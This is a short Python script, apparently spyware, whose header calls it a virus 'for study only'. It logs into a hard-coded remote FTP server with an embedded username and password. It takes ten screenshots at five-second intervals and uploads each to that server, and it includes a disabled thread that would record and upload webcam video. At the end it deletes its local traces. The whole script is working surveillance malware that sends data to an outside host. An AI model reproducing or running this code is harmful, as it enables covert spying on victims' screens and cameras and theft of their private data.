import ftplib
import shutil
import threading
import time
from pathlib import Path
import cv2
import pyautogui

'''
This code is for study only. 
Any additional modifications are not allowed.
Virus has been reported to the virus identifier.
Not allowed for commercial use.
@ Lou - Tang
'''


def clear_tmp():
    global session
    shutil.rmtree(directory_name)
    session.close()


def start_session(ip, user, pwd):
    return ftplib.FTP(ip, user, pwd)


def time_alert(sec):
    time.sleep(sec)
    global write_ok
    write_ok = False
    print('times up')


# Construct file path
def init():
    global session
    Path(directory_name).mkdir(parents=True, exist_ok=True)
    ip = '118.89.221.185'
    user = 'uploader'
    pwd = 'qwerQWER123'
    return start_session(ip, user, pwd)


# Upload video
def upload(filename):
    global session
    with open(f'{directory_name}{filename}', 'rb') as file:
        print(filename)
        session.storbinary(f'STOR {filename}', file)


# Clear and release mem
def clear_file(cap, out):
    cap.release()
    out.release()
    cv2.destroyAllWindows()


# Show frame for users
def show_frame(frame):
    cv2.imshow("cam_1", frame)


# Capture video
def capture_face():
    cap = cv2.VideoCapture(0)
    sz = (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
          int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)))
    fps = 30
    fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')

    vout = cv2.VideoWriter()
    file_name = f'{time.time()}'
    vout.open(f'{directory_name}{file_name}.mp4', fourcc, fps, sz, True)

    while write_ok:
        ret, frame = cap.read()
        vout.write(frame)

    clear_file(cap, vout)
    upload(f'{file_name}.mp4')


def capture_screen():
    global directory_name
    myScreenshot = pyautogui.screenshot()
    file_name = f'{time.time()}'
    myScreenshot.save(f'{directory_name}{file_name}.png')
    upload(f'{file_name}.png')


def loop_capture():
    cont = 0
    # Upload 10 photos
    while cont < 10:
        capture_screen()
        time.sleep(5)
        cont += 1


write_ok = True

directory_name = './tmp/'

# Initialising
session = init()

t = threading.Thread(target=time_alert, args=(5,))
t1 = threading.Thread(target=loop_capture)
# t2 = threading.Thread(target=capture_face)

# t2.start()
t1.start()
t.start()

# Ends all running threads
# t2.join()
t1.join()
t.join()

# Delete tmp file
clear_tmp()
